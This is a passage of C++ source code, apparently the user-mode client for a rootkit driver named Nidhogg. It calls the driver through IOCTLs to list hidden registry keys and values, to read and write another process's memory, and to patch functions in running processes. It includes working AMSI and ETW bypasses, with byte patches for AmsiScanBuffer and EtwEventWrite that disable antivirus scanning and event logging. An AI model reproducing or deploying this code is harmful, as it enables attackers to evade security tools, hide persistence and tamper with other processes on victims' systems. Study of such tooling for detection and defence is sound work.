			if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_QUERY_REGITEMS,
				&result, sizeof(result),
				&result, sizeof(result), &returned, nullptr)) {

				values.clear();
				values.push_back(std::to_wstring(NIDHOGG_ERROR_DEVICECONTROL_DRIVER));
				return { values, valuesKeys };
			}

			amountOfValues = result.RegItemsIndex;

			if (amountOfValues == 0)
				return { values, valuesKeys };

			valuesKeys.push_back(std::wstring(result.KeyPath));
			values.push_back(std::wstring(result.ValueName));
			result.KeyPath[0] = L'\0';
			result.ValueName[0] = L'\0';

			for (int i = 1; i < amountOfValues; i++) {
				result.RegItemsIndex = i;

				if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_QUERY_REGITEMS,
					nullptr, 0,
					&result, sizeof(result), &returned, nullptr)) {

					values.clear();
					valuesKeys.clear();
					values.push_back(std::to_wstring(NIDHOGG_ERROR_DEVICECONTROL_DRIVER));
					return { values, valuesKeys };
				}

				valuesKeys.push_back(std::wstring(result.KeyPath));
				values.push_back(std::wstring(result.ValueName));
				result.KeyPath[0] = L'\0';
				result.ValueName[0] = L'\0';
			}

			return { values, valuesKeys };
		}

		std::tuple<std::vector<std::wstring>, std::vector<std::wstring>> NidhoggRegistryQueryHiddenValues(HANDLE hNidhogg) {
			RegItem result{};
			std::vector<std::wstring> values;
			std::vector<std::wstring> valuesKeys;
			int amountOfValues = 0;
			DWORD returned;

			result.RegItemsIndex = 0;
			result.Type = REG_TYPE_HIDDEN_VALUE;

			if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_QUERY_REGITEMS,
				&result, sizeof(result),
				&result, sizeof(result), &returned, nullptr)) {

				values.clear();
				values.push_back(std::to_wstring(NIDHOGG_ERROR_DEVICECONTROL_DRIVER));
				return { values, valuesKeys };
			}

			amountOfValues = result.RegItemsIndex;

			if (amountOfValues == 0)
				return { values, valuesKeys };

			valuesKeys.push_back(std::wstring(result.KeyPath));
			values.push_back(std::wstring(result.ValueName));
			result.KeyPath[0] = L'\0';
			result.ValueName[0] = L'\0';

			for (int i = 1; i < amountOfValues; i++) {
				result.RegItemsIndex = i;

				if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_QUERY_REGITEMS,
					nullptr, 0,
					&result, sizeof(result), &returned, nullptr)) {

					values.clear();
					valuesKeys.clear();
					values.push_back(std::to_wstring(NIDHOGG_ERROR_DEVICECONTROL_DRIVER));
					return { values, valuesKeys };
				}

				valuesKeys.push_back(std::wstring(result.KeyPath));
				values.push_back(std::wstring(result.ValueName));
				result.KeyPath[0] = L'\0';
				result.ValueName[0] = L'\0';
			}

			return { values, valuesKeys };
		}
	}

	namespace ModuleUtils {
		int NidhoggPatchModule(HANDLE hNidhogg, DWORD pid, wchar_t* moduleName, char* functionName, std::vector<byte> patch) {
			DWORD returned;
			PatchedModule patchedModule{};

			patchedModule.Pid = pid;
			patchedModule.PatchLength = patch.size();
			patchedModule.ModuleName = moduleName;
			patchedModule.FunctionName = functionName;
			patchedModule.Patch = patch.data();

			if (patchedModule.ModuleName == nullptr || patchedModule.FunctionName == nullptr || patchedModule.Patch == nullptr)
				return NIDHOGG_GENERAL_ERROR;

			if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_PATCH_MODULE,
				&patchedModule, sizeof(patchedModule),
				nullptr, 0, &returned, nullptr))
				return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;

			return NIDHOGG_SUCCESS;
		}

		int NidhoggAmsiBypass(HANDLE hNidhogg, DWORD pid) {
			std::vector<byte> patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
			return NidhoggPatchModule(hNidhogg, pid, (wchar_t*)LR"(C:\Windows\System32\Amsi.dll)", (char*)"AmsiScanBuffer", patch);
		}

		int NidhoggETWBypass(HANDLE hNidhogg, DWORD pid) {
			std::vector<byte> patch = { 0xC3 };
			return NidhoggPatchModule(hNidhogg, pid, (wchar_t*)LR"(C:\Windows\System32\Ntdll.dll)", (char*)"EtwEventWrite", patch);
		}

		int NidhoggWriteData(HANDLE hNidhogg, DWORD pid, PVOID remoteAddress, SIZE_T size, MODE mode) {
			DWORD returned;
			PkgReadWriteData pkgWrite{};
			PVOID data = NULL;

			pkgWrite.Pid = pid;
			pkgWrite.RemoteAddress = remoteAddress;
			pkgWrite.LocalAddress = &data;
			pkgWrite.Size = size;
			pkgWrite.Mode = mode;

			if (pkgWrite.LocalAddress == 0 || pkgWrite.RemoteAddress == 0 || pkgWrite.Pid <= 0 || pkgWrite.Size <= 0)
				return NIDHOGG_GENERAL_ERROR;

			if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_WRITE_DATA,
				&pkgWrite, sizeof(pkgWrite),
				nullptr, 0, &returned, nullptr))
				return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;

			return NIDHOGG_SUCCESS;
		}

		PVOID NidhoggReadData(HANDLE hNidhogg, DWORD pid, PVOID remoteAddress, SIZE_T size, MODE mode) {
			DWORD returned;
			PkgReadWriteData pkgRead{};
			PVOID data = NULL;

			pkgRead.Pid = pid;
			pkgRead.RemoteAddress = remoteAddress;
			pkgRead.LocalAddress = &data;
			pkgRead.Size = size;
			pkgRead.Mode = mode;

			if (pkgRead.LocalAddress == 0 || pkgRead.RemoteAddress == 0 || pkgRead.Pid <= 0 || pkgRead.Size <= 0)
				return (PVOID)NIDHOGG_GENERAL_ERROR;

			if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_WRITE_DATA,
				&pkgRead, sizeof(pkgRead),
				&pkgRead, sizeof(pkgRead), &returned, nullptr))
				return (PVOID)NIDHOGG_ERROR_DEVICECONTROL_DRIVER;

			return data;
		}
	}
}
